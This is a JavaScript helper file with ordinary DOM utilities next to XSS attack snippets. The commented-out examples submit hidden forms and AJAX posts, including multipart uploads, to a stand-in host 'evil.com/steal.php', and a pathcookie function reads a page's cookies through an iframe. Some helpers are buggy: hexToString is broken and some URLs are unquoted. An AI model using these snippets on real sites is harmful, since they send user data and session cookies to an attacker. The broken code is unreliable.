/**
 * 
 * @authors Milo (you@example.org)
 * @date    2015-08-06 16:12:39
 * @version $Id$
 */

//兼容getElementsByClassName
function getElementsByClassName(node, classname){
	if(node.getElementsByClassName){
		return node.getElementsByClassName(classname);
	}else{
		var results = new Array();
		var elems = node.getElementsByTagName('*');
		for(var i = 0; i < elems.length;i ++){
			if(elems[i].className.indexOf(classname) != -1){
				results[results.length] = elems[i];
			}
		}
		return results;
	}
}

function childNodesFilter(node, num){
	var nodes = node.childNodes;
	var results = new Array();
	for(var i = 0;  i < nodes.length;i ++){
		if(nodes[i].nodeType == num){
			results.push(nodes[i]);
		}
	}
	return results;
}

//字符串转换为十六进制
function stringToHex(str){
　　　var val="";
　　　for(var i = 0; i < str.length; i++){
　　　　　if(val == "")
　　　　　　　val = str.charCodeAt(i).toString(16);
　　　　　else
　　　　　　　val += "," + str.charCodeAt(i).toString(16);
　　　}
　　　return val;
}
//十六进制转换为字符串
function hexToString(str){
　　　var val="";
　　　var arr = str.split(",");
　　　for(var i = 0; i < arr.length; i++){
　　　　　val += arr[i].fromCharCode(i);
　　　}
　　　return val;
}

//unicode解码
function unicodeDecode(str){
	if(!str){
 			return "";
 		}
		return unescape(str.replace(/&#x/g,'%u').replace(/;/g,''));
}
//unicode编码
function unicodeEncode(str){
	if(!str){
 			return "";
 		}
		return str.replace(/[^\u0000-\u00FF]/g,function($0){return escape($0).replace(/(%u)(\w{4})/gi,"&#x$2;")});
}


//模拟表单提交
//新建一个表单
function new_form(){
	var f = document.createElement("form");
	document.body.appendChild(f);
	f.method = "post";
	return f;
}
//表单中新建input
function create_elements(eForm, eName, eValue){
	var e = document.createElement("input");
	eForm.appendChild(e);
	e.type = 'text';
	e.name = eName;
	if(!document.all){e.style.display = 'none';}else{
	e.style.display = 'block';
	e.style.width = '0px';
	e.style.height = '0px';
	}
	e.value = eValue;
	return e;
}
// var _f = new_form(); // 创建一个 form 对象
// create_elements(_f, "name1", "value1"); // 创建 form 中的 input 对象
// create_elements(_f, "name2", "value2");
// _f.action= "http://www.evil.com/steal.php"; // form 提交地址
// _f.submit(); // 提交


//模拟Ajax请求
xhr = function(){
	/*xhr 对象*/
	var request = false;
	if(window.XMLHttpRequest) {
		request = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		try {
		request = new window.ActiveXObject('Microsoft.XMLHTTP');
		} catch(e) {}
	}
	return request;
}();

request = function(method,src,argv,content_type){
	xhr.open(method,src,false); // 同步方式
	if(method=='POST')xhr.setRequestHeader('Content-Type',content_type);
	// 设置表单的 Content-Type 类型，常见的是 application/x-www-form-urlencoded
	xhr.send(argv); // 发送 POST 数据
	return xhr.responseText; // 返回响应的内容
};
//发起Ajax请求
// attack_a = function(){
// var src = http://www.evil.com/steal.php;
// var argv_0 = "&name1=value1&name2=value2";
// request("POST",src,argv_0,"application/x-www-form-urlencoded");
// };
// attack_a();

//Ajax文件上传
// attack_a = function(){
// var src = http://www.evil.com/steal.php;
// var name1 = "value1";
// var name2 = "value2";
// var argv_0 = "\r\n";
// argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition:
// form-data; name=\"name1\"\r\n\r\n";
// argv_0 += (name1+"\r\n");
// argv_0 += "---------------------7964f8dddeb95fc5\r\nContent-Disposition:
// form-data; name=\"name2\"\r\n\r\n";
// argv_0 += (name2+"\r\n");
// argv_0 += "---------------------7964f8dddeb95fc5--\r\n";
// /*
// POST 提交的参数是以-------------------7964f8dddeb95fc5 分隔的
// 下面设置表单提交的 Content-Type 与 form-data 分隔边界为：
// multipart/form-data; boundary=-------------------7964f8dddeb95fc5
// */
// request("POST",src,argv_0,"multipart/form-data;
// boundary=-------------------7964f8dddeb95fc5");
// }
// attack_a();

//路径cookie获取
function pathcookie(src){
	var o = document.createElement("iframe"); // iframe 进入同域的目标页面
	o.src = src;
	document.getElementsByTagName("body")[0].appendChild(o);
	o.onload = function(){ // iframe 加载完成后
	d = o.contentDocument || o.contentWindow.document;
	// 获取 document 对象
	alert(d.cookie); // 获取 cookie
	};
}


//防止用户频繁点击
var LOCKFLAG=false;

 function addEvent (type,element,lockTime,fun) {
	 	element.on(type,function(){
	 		if(LOCKFLAG){return;}//如果未解锁直接return；
			 LOCKFLAG=true;//锁定
				setTimeout(function(){//解锁
			   LOCKFLAG=false;
				},lockTime);
	 		fun();
	 	})
	 
}

//阻止冒泡
function stopBubble(e)
{
	if (!e) var e = window.event;
	e.cancelBubble = true;
	if (e.stopPropagation) e.stopPropagation();
}


